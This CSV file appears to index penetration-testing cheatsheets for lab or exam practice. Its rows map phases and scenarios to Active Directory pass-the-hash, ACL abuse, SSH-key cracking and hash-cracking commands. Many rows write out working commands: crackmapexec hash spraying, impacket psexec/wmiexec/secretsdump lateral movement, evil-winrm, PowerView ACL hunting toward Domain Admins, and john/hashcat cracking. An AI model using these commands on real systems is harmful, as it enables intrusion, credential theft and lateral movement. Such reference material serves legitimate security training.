"cheatsheet_id","command_id","context","scenario_title","section_title","example","shows"
"ad-pass-the-hash-attacks","pth-verify-hash-format","section","","Phase 1: Hash Extraction","crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E","[+] <DOMAIN>\<USER>:<NTLM_HASH> (Pwn3d!)"
"ad-pass-the-hash-attacks","pth-cme-spray","section","","Phase 2: Hash Validation and Spraying","crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E","[+] <TARGET> (Pwn3d!)"
"ad-pass-the-hash-attacks","cme-smb-auth-test","section","","Phase 2: Hash Validation and Spraying","","See command documentation"
"ad-pass-the-hash-attacks","pth-verify-hash-format","section","","Phase 2: Hash Validation and Spraying","crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E","[+] <DOMAIN>\<USER>:<NTLM_HASH> (Pwn3d!)"
"ad-pass-the-hash-attacks","pth-impacket-psexec","section","","Phase 3: Lateral Movement Tool Selection","impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73","[*] Requesting shares on <TARGET>"
"ad-pass-the-hash-attacks","pth-impacket-wmiexec","section","","Phase 3: Lateral Movement Tool Selection","impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73","[*] SMBv3.0 dialect used"
"ad-pass-the-hash-attacks","pth-impacket-smbexec","section","","Phase 3: Lateral Movement Tool Selection","impacket-smbexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73","[!] Launching semi-interactive shell"
"ad-pass-the-hash-attacks","evil-winrm-hash","section","","Phase 3: Lateral Movement Tool Selection","evil-winrm -i 192.168.50.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b","Evil-WinRM shell v3"
"ad-pass-the-hash-attacks","secretsdump-hashes","section","","Phase 4: UAC Restriction Bypass","impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'","Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
"ad-pass-the-hash-attacks","pth-impacket-psexec","section","","Phase 4: UAC Restriction Bypass","impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73","[*] Requesting shares on <TARGET>"
"ad-pass-the-hash-attacks","pth-verify-hash-format","section","","Phase 4: UAC Restriction Bypass","crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E","[+] <DOMAIN>\<USER>:<NTLM_HASH> (Pwn3d!)"
"ad-pass-the-hash-attacks","secretsdump-hashes","section","","Phase 5: Post-Compromise Credential Harvesting","impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'","Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
"ad-pass-the-hash-attacks","mimikatz-logonpasswords","section","","Phase 5: Post-Compromise Credential Harvesting","","See command documentation"
"ad-pass-the-hash-attacks","pth-cme-spray","section","","Phase 5: Post-Compromise Credential Harvesting","crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E","[+] <TARGET> (Pwn3d!)"
"ad-pass-the-hash-attacks","pth-verify-hash-format","section","","Phase 6: Troubleshooting Pass-the-Hash Failures","crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E","[+] <DOMAIN>\<USER>:<NTLM_HASH> (Pwn3d!)"
"ad-pass-the-hash-attacks","cme-smb-auth-test","section","","Phase 6: Troubleshooting Pass-the-Hash Failures","","See command documentation"
"ad-pass-the-hash-attacks","lateral-movement-troubleshooting","section","","Phase 6: Troubleshooting Pass-the-Hash Failures","# Test credentials: crackmapexec smb 192.168.45.100 -u admin -p password
# Test admin access: crackmapexec smb 192.168.45.100 -u admin -p password --shares
# Test hash: crackmapexec smb 192.168.45.100 -u admin -H abc123...
# Check UAC restriction: If local admin hash fails but domain user works, UAC blocking PTH
# Verify ports: sudo nmap -p 135,445,5985 -Pn -v 192.168.45.100
# Check firewall: Test-NetConnection 192.168.45.100 -Port 80 from Windows
# Time sync: net time \\192.168.45.100 (Kerberos requires <5 min time skew)
# Service status: Get-Service WinRM,RpcSs -ComputerName 192.168.45.100","[+] Pwn3d! from CrackMapExec (admin access confirmed)"
"ad-permission-abuse-hunting","powerview-get-objectacl-genericall","scenario","Scenario 1: GenericAll on User Account - Password Reset Path","","",""
"ad-permission-abuse-hunting","powerview-convert-sidtoname","scenario","Scenario 1: GenericAll on User Account - Password Reset Path","","",""
"ad-permission-abuse-hunting","powerview-find-interestingdomainacl","scenario","Scenario 1: GenericAll on User Account - Password Reset Path","","",""
"ad-permission-abuse-hunting","powerview-get-objectacl-group","scenario","Scenario 2: GenericAll on Group - Add Self to Domain Admins","","",""
"ad-permission-abuse-hunting","powerview-find-interestingdomainacl","scenario","Scenario 2: GenericAll on Group - Add Self to Domain Admins","","",""
"ad-permission-abuse-hunting","powerview-get-netgroup-recursive","scenario","Scenario 2: GenericAll on Group - Add Self to Domain Admins","","",""
"ad-permission-abuse-hunting","powerview-get-objectacl-writedacl","scenario","Scenario 3: WriteDACL Permission - Grant Yourself GenericAll","","",""
"ad-permission-abuse-hunting","powerview-find-interestingdomainacl","scenario","Scenario 3: WriteDACL Permission - Grant Yourself GenericAll","","",""
"ad-permission-abuse-hunting","powerview-get-objectacl-writeowner","scenario","Scenario 4: WriteOwner Permission - Take Ownership Then Grant Access","","",""
"ad-permission-abuse-hunting","powerview-find-interestingdomainacl","scenario","Scenario 4: WriteOwner Permission - Take Ownership Then Grant Access","","",""
"ad-permission-abuse-hunting","powerview-get-objectacl-forcechangepassword","scenario","Scenario 5: ForceChangePassword Extended Right - Direct Password Reset","","",""
"ad-permission-abuse-hunting","powerview-find-interestingdomainacl","scenario","Scenario 5: ForceChangePassword Extended Right - Direct Password Reset","","",""
"ad-permission-abuse-hunting","powerview-find-interestingdomainacl","section","","Phase 1: Broad ACL Enumeration","Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match ""stephanie""}","IdentityReferenceName"
"ad-permission-abuse-hunting","powerview-get-objectacl-genericall","section","","Phase 1: Broad ACL Enumeration","Get-ObjectAcl -Identity ""Domain Admins"" | ? {$_.ActiveDirectoryRights -eq ""GenericAll""} | select SecurityIdentifier,ActiveDirectoryRights","SecurityIdentifier"
"ad-permission-abuse-hunting","powerview-get-objectacl-group","section","","Phase 2: Targeted ACL Enumeration (High-Value Targets)","Get-ObjectAcl -Identity ""Domain Admins"" | select SecurityIdentifier,ActiveDirectoryRights","SecurityIdentifier"
"ad-permission-abuse-hunting","powerview-get-objectacl-user","section","","Phase 2: Targeted ACL Enumeration (High-Value Targets)","Get-ObjectAcl -Identity ""sqlservice"" | select SecurityIdentifier,ActiveDirectoryRights","SecurityIdentifier"
"ad-permission-abuse-hunting","ps-ldapsearch-admins","section","","Phase 2: Targeted ACL Enumeration (High-Value Targets)","LDAPSearch -LDAPQuery ""(adminCount=1)""","adminCount"
"ad-permission-abuse-hunting","powerview-convert-sidtoname","section","","Phase 3: SID Resolution & Path Validation","Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104","DOMAIN\username"
"ad-permission-abuse-hunting","powerview-get-netgroup-recursive","section","","Phase 3: SID Resolution & Path Validation","Get-NetGroupMember -GroupName ""Domain Admins"" -Recurse","MemberName"
"ad-permission-abuse-hunting","powerview-get-objectacl-genericall","section","","Phase 4: Permission-Specific Enumeration","Get-ObjectAcl -Identity ""Domain Admins"" | ? {$_.ActiveDirectoryRights -eq ""GenericAll""} | select SecurityIdentifier,ActiveDirectoryRights","SecurityIdentifier"
"ad-permission-abuse-hunting","powerview-get-objectacl-writedacl","section","","Phase 4: Permission-Specific Enumeration","Get-ObjectAcl -Identity ""Domain Admins"" | ? {$_.ActiveDirectoryRights -match ""WriteDacl""} | select SecurityIdentifier,ActiveDirectoryRights","SecurityIdentifier"
"ad-permission-abuse-hunting","powerview-get-objectacl-writeowner","section","","Phase 4: Permission-Specific Enumeration","Get-ObjectAcl -Identity ""Domain Admins"" | ? {$_.ActiveDirectoryRights -match ""WriteOwner""} | select SecurityIdentifier,ActiveDirectoryRights","SecurityIdentifier"
"ad-permission-abuse-hunting","powerview-get-objectacl-forcechangepassword","section","","Phase 4: Permission-Specific Enumeration","Get-ObjectAcl -Identity ""administrator"" -ResolveGUIDs | ? {$_.ObjectAceType -eq ""User-Force-Change-Password""} | select SecurityIdentifier,ObjectAceType","SecurityIdentifier"
"ssh-private-key-cracking","ssh2john-extract","scenario","Scenario 1: Encrypted SSH Key from Web Disclosure","","",""
"ssh-private-key-cracking","hashid","scenario","Scenario 1: Encrypted SSH Key from Web Disclosure","","",""
"ssh-private-key-cracking","hash-rate-benchmark","scenario","Scenario 1: Encrypted SSH Key from Web Disclosure","","",""
"ssh-private-key-cracking","calculate-crack-time","scenario","Scenario 1: Encrypted SSH Key from Web Disclosure","","",""
"ssh-private-key-cracking","john-ssh-key-crack","scenario","Scenario 1: Encrypted SSH Key from Web Disclosure","","",""
"ssh-private-key-cracking","ssh2john-extract","scenario","Scenario 2: Modern SSH Key with aes-256-ctr Cipher","","",""
"ssh-private-key-cracking","hashid","scenario","Scenario 2: Modern SSH Key with aes-256-ctr Cipher","","",""
"ssh-private-key-cracking","john-ssh-key-crack","scenario","Scenario 2: Modern SSH Key with aes-256-ctr Cipher","","",""
"ssh-private-key-cracking","john-rules-attack","scenario","Scenario 2: Modern SSH Key with aes-256-ctr Cipher","","",""
"ssh-private-key-cracking","john-show-cracked","scenario","Scenario 2: Modern SSH Key with aes-256-ctr Cipher","","",""
"ssh-private-key-cracking","john-status","scenario","Scenario 2: Modern SSH Key with aes-256-ctr Cipher","","",""
"ssh-private-key-cracking","ssh2john-extract","scenario","Scenario 3: Unencrypted SSH Key - Direct Usage","","",""
"ssh-private-key-cracking","ssh2john-extract","scenario","Scenario 4: Custom Wordlist Based on Key Context","","",""
"ssh-private-key-cracking","create-policy-rules","scenario","Scenario 4: Custom Wordlist Based on Key Context","","",""
"ssh-private-key-cracking","wordlist-effectiveness","scenario","Scenario 4: Custom Wordlist Based on Key Context","","",""
"ssh-private-key-cracking","john-ssh-key-crack","scenario","Scenario 4: Custom Wordlist Based on Key Context","","",""
"ssh-private-key-cracking","john-show-cracked","scenario","Scenario 4: Custom Wordlist Based on Key Context","","",""
"ssh-private-key-cracking","ssh2john-extract","scenario","Scenario 5: Multiple Keys - Prioritization Strategy","","",""
"ssh-private-key-cracking","john-ssh-key-crack","scenario","Scenario 5: Multiple Keys - Prioritization Strategy","","",""
"ssh-private-key-cracking","john-show-cracked","scenario","Scenario 5: Multiple Keys - Prioritization Strategy","","",""
"ssh-private-key-cracking","john-status","scenario","Scenario 5: Multiple Keys - Prioritization Strategy","","",""
"ssh-private-key-cracking","ssh2john-extract","section","","Phase 2: Encryption Status Verification","ssh2john id_rsa > ssh.hash","$sshng$"
"ssh-private-key-cracking","ssh2john-extract","section","","Phase 3: Hash Extraction and Tool Selection","ssh2john id_rsa > ssh.hash","$sshng$"
"ssh-private-key-cracking","hashid","section","","Phase 3: Hash Extraction and Tool Selection","hashid '5f4dcc3b5aa765d61d8327deb882cf99' -m","[+] MD5"
"ssh-private-key-cracking","hash-identifier","section","","Phase 3: Hash Extraction and Tool Selection","hash-identifier","Possible Hashs:"
"ssh-private-key-cracking","hash-rate-benchmark","section","","Phase 3: Hash Extraction and Tool Selection","hashcat -b -m 1000 | grep -A3 'Hashmode:'","Hash rate displayed (H/s, kH/s, MH/s, GH/s)"
"ssh-private-key-cracking","create-policy-rules","section","","Phase 4: Intelligence Gathering for Custom Wordlists","echo -e 'c $2024 $!\nc $2024 $@\nc $2024 $#' > policy.rule","Rule file created"
"ssh-private-key-cracking","rule-capitalize-append","section","","Phase 4: Intelligence Gathering for Custom Wordlists","echo 'c $!' > cap-special.rule","Rule file created"
"ssh-private-key-cracking","rule-prepend-year","section","","Phase 4: Intelligence Gathering for Custom Wordlists","echo '^2 ^0 ^2 ^4' > prepend-year.rule","Rule file created"
"ssh-private-key-cracking","wordlist-effectiveness","section","","Phase 4: Intelligence Gathering for Custom Wordlists","wc -l /usr/share/wordlists/rockyou.txt && echo 'With rules: ' && python3 -c ""lines=14344391; rules=64; print(f'{lines * rules:,} total candidates')""","Line count displayed"
"ssh-private-key-cracking","hashcat-ssh-key-crack","section","","Phase 5: Cracking Execution","hashcat -m 22921 ssh.hash custom_wordlist.txt -r custom.rule --force","Cracked"
"ssh-private-key-cracking","john-ssh-key-crack","section","","Phase 5: Cracking Execution","john --wordlist=custom_wordlist.txt --rules=sshRules ssh.hash","Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH])"
"ssh-private-key-cracking","hashcat-rule-attack","section","","Phase 5: Cracking Execution","hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","Guess.Mod........: Rules"
"ssh-private-key-cracking","john-rules-attack","section","","Phase 5: Cracking Execution","john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash","guesses: X"
"ssh-private-key-cracking","john-show-cracked","section","","Phase 5: Cracking Execution","john --show hashes.txt","username:password"
"ssh-private-key-cracking","john-status","section","","Phase 5: Cracking Execution","john --status","Session..........: "
"ssh-private-key-cracking","session-management","section","","Phase 5: Cracking Execution","hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt --session=exam-target1 -o cracked.txt --outfile-format=2","Session started"
"ssh-private-key-cracking","john-show-cracked","section","","Phase 6: Key Usage and Verification","john --show hashes.txt","username:password"
"hash-cracking-methodology","hash-rate-benchmark","scenario","Scenario 1: Linux /etc/shadow Hash Cracking","","",""
"hash-cracking-methodology","calculate-crack-time","scenario","Scenario 1: Linux /etc/shadow Hash Cracking","","",""
"hash-cracking-methodology","hashcat-sha512crypt-crack","scenario","Scenario 1: Linux /etc/shadow Hash Cracking","","",""
"hash-cracking-methodology","hashcat-show-cracked","scenario","Scenario 1: Linux /etc/shadow Hash Cracking","","",""
"hash-cracking-methodology","hashcat-status-timer","scenario","Scenario 1: Linux /etc/shadow Hash Cracking","","",""
"hash-cracking-methodology","hashcat-rule-attack","scenario","Scenario 1: Linux /etc/shadow Hash Cracking","","",""
"hash-cracking-methodology","hashid","scenario","Scenario 2: NTLM Hash Cracking with Rules","","",""
"hash-cracking-methodology","hash-rate-benchmark","scenario","Scenario 2: NTLM Hash Cracking with Rules","","",""
"hash-cracking-methodology","hashcat-ntlm-crack","scenario","Scenario 2: NTLM Hash Cracking with Rules","","",""
"hash-cracking-methodology","hashcat-best64-rules","scenario","Scenario 2: NTLM Hash Cracking with Rules","","",""
"hash-cracking-methodology","hashcat-show-cracked","scenario","Scenario 2: NTLM Hash Cracking with Rules","","",""
"hash-cracking-methodology","session-management","scenario","Scenario 2: NTLM Hash Cracking with Rules","","",""
"hash-cracking-methodology","hashid","scenario","Scenario 3: Time-Constrained Bcrypt Cracking","","",""
"hash-cracking-methodology","hash-rate-benchmark","scenario","Scenario 3: Time-Constrained Bcrypt Cracking","","",""
"hash-cracking-methodology","calculate-crack-time","scenario","Scenario 3: Time-Constrained Bcrypt Cracking","","",""
"hash-cracking-methodology","attack-mode-decision","scenario","Scenario 3: Time-Constrained Bcrypt Cracking","","",""
"hash-cracking-methodology","hashcat-bcrypt-crack","scenario","Scenario 3: Time-Constrained Bcrypt Cracking","","",""
